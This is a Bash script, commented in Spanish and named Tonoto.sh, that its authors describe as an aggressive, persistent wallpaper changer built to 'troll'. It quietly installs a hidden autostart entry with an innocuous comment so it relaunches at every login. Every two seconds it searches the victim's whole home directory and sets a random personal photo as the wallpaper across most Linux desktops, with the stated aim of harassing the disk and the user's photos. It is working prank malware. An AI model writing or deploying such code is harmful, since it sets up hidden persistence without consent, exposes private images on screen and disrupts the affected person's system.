#!/bin/bash
# ==============================================================================
# Nombre: Tonoto.sh
# Creadores: Darío (Gatbat) & Abigail 🖤🐾
# Descripción: Cambiador agresivo y persistente de fondo de pantalla para Linux
#              (Modo Caos: Búsqueda continua cada 2s para saturar y trolear)
# ==============================================================================

SCRIPT_PATH="$(realpath "$0")"
AUTOSTART_DIR="$HOME/.config/autostart"
DESKTOP_FILE="$AUTOSTART_DIR/zy.desktop"

# 1. Configurar persistencia al inicio de sesión
if [ ! -f "$DESKTOP_FILE" ]; then
    mkdir -p "$AUTOSTART_DIR"
    cat <<EOF > "$DESKTOP_FILE"
[Desktop Entry]
Type=Application
Exec=bash "$SCRIPT_PATH"
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
Name=Tonoto
Comment=Cambiador automatico de fondo
EOF
fi

# 2. Función universal para forzar el fondo en cualquier entorno
aplicar_fondo() {
    local img="$1"
    [ -z "$img" ] || [ ! -f "$img" ] && return

    # A. Feh (i3, bspwm, openbox, etc.)
    if command -v feh &> /dev/null; then
        feh --bg-fill "$img" &> /dev/null
    fi

    # B. Wayland con SWWW
    if command -v swww &> /dev/null; then
        if ! pgrep -x "swww-daemon" &> /dev/null; then
            swww-daemon &> /dev/null &
            sleep 0.2
        fi
        swww img "$img" &> /dev/null
    fi

    # C. Wayland con Hyprpaper
    if command -v hyprpaper &> /dev/null; then
        hyprpaper preload "$img" &> /dev/null
        hyprpaper wallpaper ",$img" &> /dev/null
        if command -v hyprctl &> /dev/null; then
            hyprctl hyprpaper unload all &> /dev/null
        fi
    fi

    # D. Nitrogen (X11)
    if command -v nitrogen &> /dev/null; then
        nitrogen --set-scaled "$img" &> /dev/null
    fi

    # E. KDE Plasma (Moderno con CLI oficial o script DBus)
    if command -v plasma-apply-wallpaperimage &> /dev/null; then
        plasma-apply-wallpaperimage "$img" &> /dev/null
    elif command -v qdbus &> /dev/null; then
        qdbus org.kde.plasmashell /PlasmaShell org.kde.PlasmaShell.evaluateScript "
            var allDesktops = desktops();
            for (var i=0; i<allDesktops.length; i++) {
                var d = allDesktops[i];
                d.wallpaperPlugin = 'org.kde.image';
                d.currentConfigGroup = Array('Wallpaper', 'org.kde.image', 'General');
                d.writeConfig('Image', 'file://$img');
            }
        " &> /dev/null
    fi

    # F. XFCE Desktop
    if command -v xfconf-query &> /dev/null; then
        for prop in $(xfconf-query -c xfce4-desktop -l 2>/dev/null | grep "last-image"); do
            xfconf-query -c xfce4-desktop -p "$prop" -s "$img" &> /dev/null
        done
    fi

    # G. GNOME / Cinnamon / Budgie / MATE (Soporte tema claro y tema oscuro)
    if command -v gsettings &> /dev/null; then
        gsettings set org.gnome.desktop.background picture-uri "file://$img" 2>/dev/null
        gsettings set org.gnome.desktop.background picture-uri-dark "file://$img" 2>/dev/null
        gsettings set org.cinnamon.desktop.background picture-uri "file://$img" 2>/dev/null
        gsettings set org.mate.background picture-filename "$img" 2>/dev/null
    fi
}

# 3. Bucle implacable cada 2 segundos (Búsqueda activa y cambio continuo)
while true; do
    # Búsqueda continua en vivo en $HOME para mantener el hostigamiento del disco y las fotos
    imagen=$(find "$HOME" -type f \( -iname "*.jpg" -o -iname "*.png" -o -iname "*.jpeg" -o -iname "*.webp" \) 2>/dev/null | shuf -n 1)

    if [ -n "$imagen" ]; then
        aplicar_fondo "$imagen"
    fi

    sleep 2
done
